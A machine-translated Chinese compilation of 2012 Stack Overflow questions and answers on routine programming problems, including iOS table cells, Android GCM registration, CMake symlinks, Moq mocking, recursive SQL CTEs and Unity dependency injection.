> ID：11866585
> 
> 赞同：0
> 
> 时间：2012-08-08T14:21:36.447
> 
> 标签：objective-c, ios, xcode, uitableview

我有一个如下图所示的表格视图：

当我在缺席部分选择表格行时，我想更改复选框并使用标记复选框

我知道我应该使用这个方法 didSelectRowAtIndexPath: "that when user select the row it should change the picture" 但我不知道如何

你能帮帮我吗

提前致谢！

这是我的代码：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
NSString *key = [[self sectionKeys] objectAtIndex:[indexPath section]];
NSArray *contents = [[self sectionContents] objectForKey:key];
NSString *contentForThisRow = [contents objectAtIndex:[indexPath row]];

if (indexPath.section != 2) {
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@"Cell"];
    cell.textLabel.text =contentForThisRow;
    return cell;
}
else {
    CheckBoxCompensationViewCell *cell = (CheckBoxCompensationViewCell*)[tableView 
dequeueReusableCellWithIdentifier:@"CheckBoxCompensationViewCell"];

    cell.imageView.image=[UIImage imageNamed:@"emptycheck-box.png"];
    cell.checkBox.image = image;
    if(indexPath.row == 0){
        cell.compensationText.text =@"Red";
    }
    else if (indexPath.row == 1){
        cell.compensationText.text =@"Green";

    }else if(indexPath.row == 2){
        cell.compensationText.text =@"Blue";
    }
    return cell;
}
}

 - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
 {
// I don't know what should I have here , probably mark box image but I don't know how
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:26:16.237

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSIndexPath *previousPath = self.selectedIndexPath;
    self.selectedIndexPath = indexPath;
    [tableView reloadRowsAtIndexPaths:@[previousPath, indexPath] withRowAnimation:UITableViewRowAnimationNone];
} 
```

请注意，这是非常基本的，不会取消选择单元格，您需要检查 cellForRowAtIndexPath 中所选索引路径的状态：

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:28:05.173

它是如此容易。当用户选择单元格时，您应该更新数据模型并重新加载表。数据模型存储按钮状态。在 cellForRowAtIndexPath 方法中，根据数据模型状态设置按钮。就这样。

# android - GCM ACCOUNT_MISSING 错误

> ID：11866587
> 
> 赞同：9
> 
> 时间：2012-08-08T14:21:40.813
> 
> 标签：android, google-cloud-messaging

如何获取registrationId？

我总是收到 ACCOUNT_MISSING 错误

主要活动

 `````
package com.example.gcm;
import android.os.Bundle;
import android.app.Activity;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.support.v4.app.NavUtils;
import com.google.android.gcm.GCMRegistrar;

public class MainActivity extends Activity {

    private static final String SENDER_ID = "45552950387";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        GCMRegistrar.checkDevice(this);
        GCMRegistrar.checkManifest(this);
        final String regId = GCMRegistrar.getRegistrationId(this);
        if (regId.equals("")) {
          GCMRegistrar.register(this, SENDER_ID);
          Log.d("show", "Already registered1"+regId);
        } else {
          Log.d("show", "Already registered");
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }

} 
````  `GCMIntentService

 `````
package com.example.gcm;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.google.android.gcm.GCMBaseIntentService;

public class GCMIntentService extends GCMBaseIntentService {
    private static final String TAG = "GCMIntentService";

    public GCMIntentService() {
        super("45552950387");
    }

    @Override
    protected void onRegistered(Context context, String registrationId) {
        Log.i(TAG, "Device registered: regId = " + registrationId);
    }

    @Override
    protected void onUnregistered(Context context, String registrationId) {
        Log.i(TAG, "Device unregistered");
    }

    @Override
    protected void onMessage(Context context, Intent intent) {
        Log.i(TAG, "Received message");
        String a = intent.getStringExtra("A");
        generateNotification(context, a);
    }

    @Override
    protected void onDeletedMessages(Context context, int total) {
        Log.i(TAG, "Received deleted messages notification");

    }

    @Override
    public void onError(Context context, String errorId) {
        Log.i(TAG, "Received error: " + errorId);

    }

    @Override
    protected boolean onRecoverableError(Context context, String errorId) {
        Log.i(TAG, "Received recoverable error: " + errorId);
        return super.onRecoverableError(context, errorId);
    }

    private void generateNotification(Context context, String message) {

        NotificationManager notificationManager = (NotificationManager) context
                .getSystemService(NOTIFICATION_SERVICE);

        Notification notification = new Notification();
        notification.icon = R.drawable.ic_launcher;
        notification.tickerText = "notification on status bar.";
        notification.defaults = Notification.DEFAULT_ALL;
        notification.setLatestEventInfo(context, "Title", message, null);
        notificationManager.notify(0, notification);
    }
} 
````  `AndroidManifest.xml

 `````
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.example.gcm"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="15" />

<uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
<uses-permission android:name="android.permission.INTERNET" /> 
<uses-permission android:name="android.permission.GET_ACCOUNTS" />
<uses-permission android:name="android.permission.WAKE_LOCK" />

<permission android:name="com.example.gcm.permission.C2D_MESSAGE" android:protectionLevel="signature" />
<uses-permission android:name="com.example.gcm.permission.C2D_MESSAGE" /> 

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name=".MainActivity"
        android:label="@string/title_activity_main" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
    <receiver android:name="com.google.android.gcm.GCMBroadcastReceiver" android:permission="com.google.android.c2dm.permission.SEND" >
      <intent-filter>
        <action android:name="com.google.android.c2dm.intent.RECEIVE" />
        <action android:name="com.google.android.c2dm.intent.REGISTRATION" />
        <category android:name="com.example.gcm" />
      </intent-filter>
    </receiver>
 <service android:name="com.example.gcm.GCMIntentService" />
</application> 
```` 

这是我的 LogCat

 `````
08-08 13:54:19.844: D/dalvikvm(618): GC_EXPLICIT freed 45K, 49% free 2751K/5379K, external 1625K/2137K, paused 58ms
08-08 13:54:22.944: D/GCMRegistrar(618): resetting backoff for com.example.gcm
08-08 13:54:22.944: V/GCMRegistrar(618): Registering app com.example.gcm of senders 45552950387
08-08 13:54:22.994: D/show(618): Already registered1
08-08 13:54:23.224: V/GCMBroadcastReceiver(618): onReceive: com.google.android.c2dm.intent.REGISTRATION
08-08 13:54:23.224: V/GCMBroadcastReceiver(618): GCM IntentService class: com.example.gcm.GCMIntentService
08-08 13:54:23.224: V/GCMBaseIntentService(618): Acquiring wakelock
08-08 13:54:23.464: V/GCMBaseIntentService(618): Intent service name: GCMIntentService-45552950387-3
08-08 13:54:23.504: D/GCMBaseIntentService(618): handleRegistration: registrationId = null, error = ACCOUNT_MISSING, unregistered = null
08-08 13:54:23.504: D/GCMBaseIntentService(618): Registration error: ACCOUNT_MISSING
08-08 13:54:23.524: I/GCMIntentService(618): Received error: ACCOUNT_MISSING
08-08 13:54:23.524: V/GCMBaseIntentService(618): Releasing wakelock 
````  `我确定发件人 ID 是正确的，并且在项目类路径中导入 gcm.jar

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-08T14:25:31.053

手机上没有 Google 帐户时发生 ACCOUNT_MISSING 错误。

> 手机上没有 Google 帐户。Android 应用程序应要求用户打开帐户管理器并添加一个 Google 帐户。固定在设备端。

[在这里](http://developer.android.com/guide/google/gcm/gcm.html#handling_reg)查看更多信息。```````

# opengl - OpenGL 自动 sRGB 转换与手动 sRGB 转换

> ID：11866588
> 
> 赞同：1
> 
> 时间：2012-08-08T14:21:51.343
> 
> 标签：opengl, colors, gamma, srgb

我最近一直在阅读有关 sRGB 转换及其带来的一些好处的信息。我在 GPU Gems 3 中阅读了一篇非常有用的文章，该文章现在免费提供，其中涵盖了一些自动方法与手动着色器编写的方法。这是这篇文章：

[https://developer.nvidia.com/gpugems/GPUGems3/gpugems3_ch24.html](https://developer.nvidia.com/gpugems/GPUGems3/gpugems3_ch24.html)

在什么情况下使用手动转换而不是自动转换是有益的？在我看来，使用传递给 glTexImage2D 的 GL_SRGB_EXT 和使用 GL_EXT_framebuffer_sRGB 不需要任何手动转换？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T17:15:04.830

好吧，那篇文章已经提出了一个原因。如果您假设（错误的）伽马值 2.0，您可以使用 sqrt 计算它，这可能比屏幕后面的内置方法更快，很可能类似于`pow(frag.rgb,1.0/2.2)`. 当然，如果渲染到 sRGB 是在硬件中实现的，这不会优化任何东西。

另一个原因可能是您想自己在非线性色彩空间中进行一些计算。例如，如果您想转换为[Y'CbCr 之](https://en.wikipedia.org/wiki/Y%27CbCr)类的图像处理任务。

最后，也许您可​​以通过一些查询获得输出设备的伽玛值的非常精确的值，然后进行手动转换可能会提供（可能几乎不明显）更好的质量。

# mysql - MySQL重复行，并添加一些新数据

> ID：11866594
> 
> 赞同：3
> 
> 时间：2012-08-08T14:22:12.453
> 
> 标签：mysql

我找到了很多关于如何复制一行的答案。这很容易，但是我似乎没有找到任何像我正在寻找的例子。我需要复制一行的一部分，并添加一些新数据。

所以复制一行：

```
Insert Into TableName (user, course,title) 
Select user, 11 From TableName Where course=6; 
```

我将如何复制该行，并将我自己的信息添加到标题中？我会在选择语句后加逗号吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-08T14:24:22.053

您可以像修改课程信息一样执行此操作 - 只需提供硬编码值：

```
Insert Into TableName (user, course, title)
Select user, 11, 'My New Title' From TableName Where course=6;
                 ^^^^^^^^^^^^^^ 
```

数据不是来自 并不重要，`TableName`只要为`title`您要插入的字段提供值即可。

# cmake - 如何防止 CMake 在安装时为共享库创建符号链接？

> ID：11866597
> 
> 赞同：7
> 
> 时间：2012-08-08T14:22:17.443
> 
> 标签：cmake, shared-libraries, software-packaging

有没有办法阻止 CMake 为共享库创建符号链接，比如`libfoo.so`当你使用 so-versioning 时（这意味着你会有类似的东西`libfoo.so.0.8`）？

我问这个的原因是我有一个项目，我想让该项目的多个版本可以并行安装。然而，如果像符号链接这样的文件存在于多个包中，大多数包管理器会拒绝并行安装。

作为背景信息：我们正在使用 CPack 构建包，最终我认为这是 CPack 的一个缺陷，您无法阻止此符号链接，或者至少能够分离开发包和运行时包，例如 debian。但是，到目前为止，我有这样的幻想，即完全阻止 CMake 创建符号链接可能比修补 CPack 更容易。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-08T18:33:43.337

对于共享库，您可以使用[install 命令](https://cmake.org/cmake/help/latest/command/install.html?highlight=NAMELINK_SKIP)`NAMELINK_SKIP`的选项来防止生成指向版本化库文件的无版本库名称符号链接。生成的 CPack 安装程序将在安装时遵循该设置。必须通过设置共享库目标的属性来指定库版本：`SOVERSION`

以下示例代码概述了所需的步骤：

```
add_library(foo SHARED foo.c)

set_target_properties(foo PROPERTIES SOVERSION "0.8")

install(TARGETS foo LIBRARY DESTINATION lib NAMELINK_SKIP)

include(CPack) 
```

# html - 多次悬停替换

> ID：11866603
> 
> 赞同：0
> 
> 时间：2012-08-08T14:22:44.260
> 
> 标签：html, css, hover

我正在制作一个 CSS 按钮，我现在正在关注一个问题。

我在 CSS 中有以下内容：

```
.proceed {
    width: 135px;
    height: 38px;
    position: relative;
    cursor: pointer;
}

.proceedText {
    position: relative;
    margin: 0 auto;
    max-width: 106px;
    height: 29px;
    padding-top: 10px;
    opacity: 1;
    transition: 0.7s ease-in-out;
    -webkit-transition: 0.7s ease-in-out;
    -moz-transition: 0.7s ease-in-out;
    -o-transition: 0.7s ease-in-out;
    -ms-transition: 0.7s ease-in-out;
}

#proceedButton {
    background: rgba(0, 0, 0, 0.5);
    width: 100%;
    height: 100%;
    border: 1px solid rgba(0, 0, 0, 0.6);
}

#proceedLight {
    background: rgba(255, 255, 255, 0.06);
    width: 100%;
    height: 20px;
    position: absolute;
} 
```

并遵循H​​TML：

```
 <div class="proceed">
                <a onClick="startGateway('137340');">
                    <div id="proceedButton">
                        <div id="proceedLight"></div>
                        <h1 class="proceedText">Click to Proceed</h1>
                    </div>
                </a>
            </div> 
```

当我遇到问题时，我想做的是...

我想制作几个悬停效果，但是让每个元素悬停并不能完全达到我想要的效果，因为只有当我的光标位于“元素”上时它才会悬停。

我想将鼠标悬停在 .proceed 上以影响所有其他元素。因此，当光标位于“.proceed”上时，它会执行以下操作。

```
.proceedText:hover {
    opacity: 0.5;
}

#proceedLight:hover {
    bottom: 0;
} 
```

有什么解决办法吗？导致每个元素都悬停，并没有真正按我想要的方式工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:28:18.023

需要将鼠标悬停在 .proceed 上，我认为这会起作用。如果不尝试使用 jquery 更改 dom 和效果。

```
.proceed:hover  .proceedText {opacity: 0.5;}
.proceed:hover  #proceedLight{bottom: 0;} 
```

修改。我认为jquery，就像上面的评论一样，是最好的解决方案。

# maven - 开发 maven-plugin：如何获取 pom.xml 中定义的直接依赖项列表？

> ID：11866604
> 
> 赞同：1
> 
> 时间：2012-08-08T14:22:47.800
> 
> 标签：maven, maven-2, maven-3, maven-plugin

我正在使用类**org.apache.maven.project.MavenProject的方法****getDependencyManagement()**和**getDependencies()**来获取执行插件的 pom.xml 的依赖项列表，但我也得到了继承的依赖项。

 **如何获取**直接**在 pom.xml 中定义的依赖项列表，而不是任何继承的依赖项。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-09T06:49:30.663

从`MavenProject`类中，您可以使用该`getDependencyArtifacts()`方法。它的 Javadoc 内容如下：

```
/**
 * Direct dependencies that this project has.
 * @return Set<Artifact>
 * @see #getArtifacts() to get all transitive dependencies
 */ 
```**

# java - 从文件中查找访问次数最多的 URL

> ID：11866608
> 
> 赞同：0
> 
> 时间：2012-08-08T14:22:55.263
> 
> 标签：java, algorithm, data-structures

我有一个包含数百万条记录的文件。文件中的每一行（记录）都将有一个用户 ID 和一个相应的 URL（字符串）。我需要在文件中找到 1000 个访问量最大的 URL（字符串）。

我需要使用 java 应用程序来做到这一点。最好的方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:25:47.897

不是Java，而是为了记录：

```
$ cat records.txt
user1 http://example.com/
user2 http://example.com/
user2 http://example.com/some/path
user1 http://example.com/yet/another path

$ cut -d" " -f2 < records.txt | sort | uniq -c | sort -n -r | head -1000 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:37:40.717

将其插入数据库，然后使用 sql 查询检索数据，例如“select count(*), url fromvisited group by url order by count(*)”

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:33:23.387

以 URL 为键、计数为值的 Map 无疑是最简单的方法（例如，`HashMap<String, Integer>`）。每次阅读一行时增加计数。

要获得前 1000 名，请将所有条目放入`TreeSet`一个自定义项中，该自定义`Comparator`项对条目的值进行排序。然后转出集合中的前 1000 个项目。

这应该适用于“数百万”条记录。但是，如果您有数十亿甚至几亿条记录，您可能会遇到问题，因为一切都在内存中完成。

# javascript - 放大高图中的点

> ID：11866610
> 
> 赞同：1
> 
> 时间：2012-08-08T14:22:58.143
> 
> 标签：javascript, jquery, css, highcharts

看到这个小提琴：http: [//jsfiddle.net/ebuTs/13/](http://jsfiddle.net/ebuTs/13/)

如何使点（点）更大？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:26:06.783

您可以使用[标记半径](http://www.highcharts.com/ref/#point-marker)：

```
var chart = new Highcharts.Chart({
//...
    series: [{
        data: [29.9, 71.5, 106.4, 129.2, 144.0, 176.0, 135.6, 148.5, 216.4, 194.1, 95.6, 54.4],

    marker: {
        radius: 5// Play around with this value as needed.
    } 
```

# spring - 配置问题：找不到 XML 模式命名空间的 Spring NamespaceHandler [http://www.springframework.org/schema/tx]

> ID：11866611
> 
> 赞同：4
> 
> 时间：2012-08-08T14:23:00.697
> 
> 标签：spring, maven, jboss, xml-parsing, xml-namespaces

在 JBOSS 服务器启动期间，我收到此错误，

```
19:44:59,307 ERROR [STDERR] 23813 [main] ERROR org.springframework.web.context.ContextLoader - Context initialization failed
19:44:59,307 ERROR [STDERR] org.springframework.beans.factory.parsing.BeanDefinitionParsingException: Configuration problem: Unable to locate Spring NamespaceHandler for XML schema namespace [http://www.springframework.org/schema/tx]
Offending resource: ServletContext resource [/WEB-INF/applicationContext.xml]
19:44:59,307 ERROR [STDERR]     at org.springframework.beans.factory.parsing.FailFastProblemReporter.error(FailFastProblemReporter.java:68)
19:44:59,307 ERROR [STDERR]     at org.springframework.beans.factory.parsing.ReaderContext.error(ReaderContext.java:85)
19:44:59,307 ERROR [STDERR]     at org.springframework.beans.factory.parsing.ReaderContext.error(ReaderContext.java:80)
19:44:59,307 ERROR [STDERR]     at org.springframework.beans.factory.xml.BeanDefinitionParserDelegate.error(BeanDefinitionParserDelegate.java:281)
19:44:59,307 ERROR [STDERR]     at org.springframework.beans.factory.xml.BeanDefinitionParserDelegate.parseCustomElement(BeanDefinitionParserDelegate.java:1294)
19:44:59,307 ERROR [STDERR]     at org.springframework.beans.factory.xml.BeanDefinitionParserDelegate.parseCustomElement(BeanDefinitionParserDelegate.java:1287)
19:44:59,307 ERROR [STDERR]     at org.springframework.beans.factory.xml.DefaultBeanDefinitionDocumentReader.parseBeanDefinitions(DefaultBeanDefinitionDocumentReader.java:135) 
```

这就是我的 application.xml 的样子，

```
<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tx="http://www.springframework.org/schema/tx"
    xmlns:aop="http://www.springframework.org/schema/aop"
    xsi:schemaLocation="http://www.springframework.org/schema/beans
    http://www.springframework.org/schema/beans/spring-beans-2.5.xsd
    http://www.springframework.org/schema/tx
    http://www.springframework.org/schema/tx/spring-tx-2.5.xsd
    http://www.springframework.org/schema/aop
    http://www.springframework.org/schema/aop/spring-aop-2.5.xsd"> 
```

我正在使用spring 2.5.6 ...关于错误的任何建议..

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-08T14:33:26.070

这可能是因为您`spring-tx*.jar`在类路径中缺少该文件。你能验证这个文件是否在类路径中。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-01-07T15:59:33.390

供将来参考：

如果您使用的是 Maven，可能您忘记了 spring-tx 依赖项。

```
 <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-tx</artifactId>
        <version>${org.springframework.version}</version>
    </dependency> 
```

问候

# android - Android 按钮背景选择器

> ID：11866623
> 
> 赞同：9
> 
> 时间：2012-08-08T14:23:32.700
> 
> 标签：android, button, selector

我想为按钮使用以下选择器：

```
<selector xmlns:android="http://schemas.android.com/apk/res/android">

    <item android:drawable="@drawable/jobs" android:state_pressed="true">
        <shape android:shape="rectangle">
            <corners android:radius="5dp" />
        </shape>
<scale android:scaleHeight="90%" android:scaleWidth="90%" />
    </item>
    <item android:drawable="@drawable/jobs"></item>

</selector> 
```

但它不起作用。我想用相同的drawable使按钮的角变圆并缩小10%。实际上，我想使用单个可绘制对象来提供按钮按下效果。可能吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-08-08T14:32:09.493

我发现最好将状态逻辑和可绘制代码分开。来自 Android 文档：http: [//developer.android.com/guide/topics/resources/drawable-resource.html#StateList](http://developer.android.com/guide/topics/resources/drawable-resource.html#StateList)

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:state_pressed="true"
          android:drawable="@drawable/button_pressed" /> <!-- pressed -->
    <item android:state_focused="true"
          android:drawable="@drawable/button_focused" /> <!-- focused -->
    <item android:state_hovered="true"
          android:drawable="@drawable/button_focused" /> <!-- hovered -->
    <item android:drawable="@drawable/button_normal" /> <!-- default -->
</selector> 
```

然后，我会将代码放在单独的可绘制 XML 中以提供圆角。我不确定您是否甚至可以直接在`selector`.

# c# - Moq - 如何模拟属性但允许在 C# 中调用方法？

> ID：11866634
> 
> 赞同：2
> 
> 时间：2012-08-08T14:23:57.640
> 
> 标签：c#, moq

我有以下代码：

```
public class Weather
{
    public int Temperature { get; set; }
    public string Description { get; set; }
}

public class WeatherProvider
{
    public virtual Weather GetWeather()
    {
        var w = new Weather();
        var hour = Hour;
        if (hour < 5)
        {
            w.Description = "Sunny";
            w.Temperature = 12;
        }
        else if (hour < 12)
        {
            w.Description = "Windy";
            w.Temperature = 18;
        }
        else
        {
            w.Description = "Snow";
            w.Temperature = 2;
        }
        return w;
    }

    public virtual int Hour
    {
        get { return DateTime.Now.Hour; }
    }
}

var mockWeatherProvider = new Moq.Mock<WeatherProvider>(MockBehavior.Loose);
mockWeatherProvider.SetupGet(x => x.Hour).Returns(2);

var actualWeather = mockWeatherProvider.Object.GetWeather();//This line always returns null? WHY???
mockWeatherProvider.Verify(x=>x.GetWeather()); 
```

任何人都可以解释为什么行 var actualWeather = mockWeatherProvider.Object.GetWeather() 返回 null 吗？我实际上希望调用真正的方法。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-08T14:25:43.810

您尚未为该`GetWeather()`方法设置行为。基本上，你在这里做什么

```
var mockWeatherProvider = new Moq.Mock<WeatherProvider>(MockBehavior.Loose); 
```

*正在创建一个看起来*像 WeatherProvider的空对象。你必须告诉你想要使用的`mockWeatherProvider`每个方法和属性应该为你做什么*。*

* * *

**编辑，因为我意识到你可能真正想要什么**

如果您试图模拟基本上只有一半课程的内容，那么在这种特殊情况下，您将以错误的方式进行实施。例如，如果您想模拟`Hour`返回的内容，则可以`WeatherProvider`通过某些`TimeProvider`实现或某些`WeatherProvider`依赖于的实现将该属性提供给该属性。

```
var mockedTimeProvider = new Moq.Mock<TimeProvider>(MockBehavior.Loose);
mockedTimeProvider.SetupGet(p => p.Hour).Returns(2);

var weatherProvider = new WeatherProvider(mockedTimeProvider.Object);
var actualWeather = weatherProvider.GetWeather(); 
```

* * *

**再次编辑**

尝试将您`GetWeather()`的设置**为非**虚拟，然后使用存根而不是完全模拟来生成模拟。这应该防止该方法被默认返回器覆盖。但是，这种方式会使您的设计有些混乱，并且不会像上面那样使事情变得清晰。关注点分离等等。=)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-21T15:28:11.707

通过使用松散的模拟，您将获得所有虚拟属性和方法的默认值。您想使用 CallBase 告诉 Moq 故障恢复到正常实现。

尝试这个：

```
var mockWeatherProvider = new Moq.Mock<WeatherProvider>(MockBehavior.Loose) { CallBase = true };
mockWeatherProvider.SetupGet(x => x.Hour).Returns(2); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:27:44.760

您的模拟没有指定 GetWeather 调用的实现。由于您是在模拟对象而不是您的具体实现上进行操作，因此 Moq 将返回默认值。在这种情况下，默认值为 null。

如果您想测试实现，您应该只使用具体实现并在该对象上设置 Hour 的行为。这将允许您练习已实现的代码并验证其行为。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-08T14:30:34.037

尝试

```
var mockWeatherProvider = new Moq.Mock<WeatherProvider>(MockBehavior.Normal); 
```

# jquery - fancybox beforeClose 加载 url

> ID：11866638
> 
> 赞同：1
> 
> 时间：2012-08-08T14:24:03.247
> 
> 标签：jquery, html, fancybox

我有一个包含 iframe 的页面，在所述 iFrame 中有几个指向视频内容的链接。我目前设置的是，当您单击 iframe 中的链接时，它会在 iframe 父窗口中打开一个 Fancybox 并播放视频。哪个工作正常，不是问题。

尝试关闭 Fancybox 时，它可以正常工作并关闭视频。但是在使用 IE 时，由于某种原因，它会一直在后台播放视频，因此即使 Fancybox 项目已关闭，您仍然可以听到播放声音。

我无法更改媒体类型，因为它会自动检测用户浏览器所需的播放类型（因此我将使用 WMP）。

目前我唯一能想到的解决方法是让 Fancybox 在 beforeClose 回调函数上加载一个空白页面，以便它尝试关闭的页面不再包含视频

我试图将以下代码添加到我的 Fancybox 中，但它并没有按照我认为的方式加载页面，我有什么问题。

```
$('a').click(function(e) {
    parent.$.fancybox({
            href : this.href,
            type : 'iframe',
            width : 990,
            beforeClose : function (){
                parent.$.fancybox({ href: 'blank.html'});
            }
        });
    e.preventDefault();
}); 
```

我将尝试在小提琴上制作一个演示版本，因为由于机密性，我无法向您展示真实版本

**编辑**

HTML代码如下（不含真实链接）

```
<a class="fancybox fancybox.iframe" href="THE LINK">Link</a> 
```

# eclipse - VS 2010 中的 Eclipse 风格搜索？

> ID：11866639
> 
> 赞同：0
> 
> 时间：2012-08-08T14:24:07.387
> 
> 标签：eclipse, visual-studio-2010, search, grep

在 Eclipse 中，当我在项目中搜索字符串时，我会得到一个漂亮的小搜索结果框，其中显示了包含该字符串的每个文件以及文件系统层次结构。

在 VS2010 中，当我在项目中搜索字符串时，我必须通过字符串的每个外观单击“下一步”，有时当它不断​​在相同位置之间来回跳转时，我不会意识到我处于循环中。

VS2010 是否有相当于 Eclipse 风格的搜索？我知道有 Find Symbol，但这似乎没有在 aspx 文件中搜索。我知道我可以使用外部 grep 工具，但我希望 IDE 中有一些东西。

有没有？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:58:30.170

“在文件中查找”将以蛮力进行字符串搜索。

编辑 => 查找和替换 => 在文件中查找或 Ctrl+Shift+F

但通常人们在他们真正想要“导航到”时使用它，这是一种快速符号搜索（Ctrl+'，'）

# sql-server - sql遍历父子

> ID：11866640
> 
> 赞同：2
> 
> 时间：2012-08-08T14:24:10.393
> 
> 标签：sql-server, hierarchical

我正在处理以下形式的一些分层数据：

```
Level      Parent    PrimaryKey    LevelDepth    RevenuePct
Total       NULL     2786f8161           0           100
US          Total    33f254b0f           1           60
UK          Total    462adbba            1           25
Asia        Total    5322678b3           1           15
Mobile       US      75b72bdf1           2           10
Laptop       US      813784df5           2           10
PC           US      9550f97c            2           15
Consulting   US      a44ae3ef8           2           25
Mobile       UK      ace663d07           2           10
Laptop       UK      b373e61c            2           8
PC           UK      ca590ef44           2           7
Mobile      Asia     d136f267e           2           15 
```

我希望它以下列形式显示：

```
Breakup                      Revenue [%]
Total                           100
    US                           60
            Mobile               10
            Laptop               10
            PC                   15
            Consulting           25
    UK                           25
            Mobile               10
            Laptop                8
            PC                    7
    Asia                         15
            Mobile               15 
```

实际问题有6-7级嵌套。

我对该领域相对较新，并且正在尝试使用 CTE，但由于子条目在不同的父项中重复（即我有美国、英国等的移动类别），因此我遇到了加入条件的问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:46:04.580

这是一种方法。`Path`列用于排序 - 您可能应该而不是 \ 连接固定宽度`level`来生成路径。查询通过递归调用 cte 部分来工作，直到没有行满足 cte 的第一部分（表示为`cte`union all 之后的第二部分）和 table1 之间的连接条件。

```
; with cte as (
  select level, parent, revenuepct, leveldepth, cast (level as varchar(1000)) Path
    from table1
   where parent is null
  union all
  select a.level, a.parent, a.revenuepct, a.leveldepth, cast (path + '\' + a.level as varchar(1000))
    from table1 a
   inner join cte
      on a.parent = cte.level
)
-- Simple indentation
select space(leveldepth * 4) + level as Breakup, 
       revenuepct as [revenue %]
  from cte
 order by path
-- Max recursive calls, 0 = unlimited
option (maxrecursion 10) 
```

[这是带有示例的 Sql Fiddle](http://sqlfiddle.com/#!3/8c6d6/6)。

[这是关于递归 cte 的文章的链接](http://msdn.microsoft.com/en-us/library/ms186243%28v=sql.105%29.aspx)

# svn - svn:忽略所有子目录

> ID：11866642
> 
> 赞同：0
> 
> 时间：2012-08-08T14:24:16.990
> 
> 标签：svn, ignore, svnignore

我的 svn st 输出如下所示：

```
?       wp-content/uploads/2012/07/file.jpg
?       wp-content/uploads/2012/07/some_other_file.jpg
?       wp-content/uploads/2012/08/more_file.jpg
?       wp-content/uploads/2012/08/another_jpeg.jpg 
```

我不希望其中的任何文件`uploads\2012`同步（但我确实希望该`uploads`文件夹位于 repo 中，以及其中的一些其他内容）。所以我这样做：

`svn propedit svn:ignore wp-content/uploads`

并添加：

```
2012
2012/* 
```

`svn st`仍然显示 2012 年的所有新文件/

好吧，我一定不理解 svn:ignore，所以让我们试试

`svn propset svn:ignore '*' wp-content/uploads/2012`

嗯。`svn st`仍然显示所有这些上传。

我究竟做错了什么？

# c# - Unity InjectionConstructor 用于仅覆盖单个构造函数的多参数构造函数

> ID：11866643
> 
> 赞同：44
> 
> 时间：2012-08-08T14:24:17.167
> 
> 标签：c#, unity-container

我有一个带有这样的构造函数的类：

```
public class Bar
{
    public Bar(IFoo foo, IFoo2 foo2, IFoo3 foo3, IFooN fooN, String text)
    {

    }
} 
```

我想在 Unity 中注册 Bar 并为文本提供一个值：

```
unity.RegisterType<Bar, Bar>(new InjectionConstructor("123")); 
```

但是我不能这样做，因为 Bar 没有单参数构造函数。

有没有办法在不指定所有其他参数的情况下为文本提供值`ResolvedParameter<IFooN>`等等。我真的不喜欢它，很多代码，每次我更改 Bar 的构造函数时，我都需要添加另一个 ResolvedParameter

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-08-08T19:17:40.293

Unity 无法做到这一点。你能做的最好的事情是：

```
container.RegisterType<Bar>(
    new InjectionConstructor(
        typeof(IFoo), typeof(IFoo2), typeof(IFoo3), typeof(IFooN), "123")); 
```

或者您可以使用`SmartConstructor`由[TecX](http://tecx.codeplex.com)项目提供的。[这篇博文](http://outlawtrail.wordpress.com/2012/08/02/fun-with-constructor-arguments-part-1-pick-choose/)描述了一些背景。

注册将如下所示：

```
container.RegisterType<Bar>(new SmartConstructor("text", "123")); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-09-20T10:53:57.317

